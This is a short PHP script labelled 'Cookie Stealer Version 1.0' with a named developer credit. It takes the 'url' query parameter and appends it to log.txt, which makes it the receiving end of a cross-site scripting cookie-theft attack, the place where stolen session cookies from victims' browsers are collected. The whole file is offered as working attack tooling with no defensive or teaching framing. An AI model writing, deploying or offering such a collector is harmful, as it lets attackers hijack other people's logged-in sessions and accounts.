<?php
  ##############################
	# Cookie Stealer Version 1.0 #
	#    Developer : Dibyendu    #
	##############################
	
	
	$cookies=$_GET['url'];
	$cookies=$cookies."\n";
	if($file=fopen("log.txt","a"))
	{
		fwrite($file,$cookies);
		fclose($file);
	}
	else
	{
		echo "Unable to open file";
	}
?>
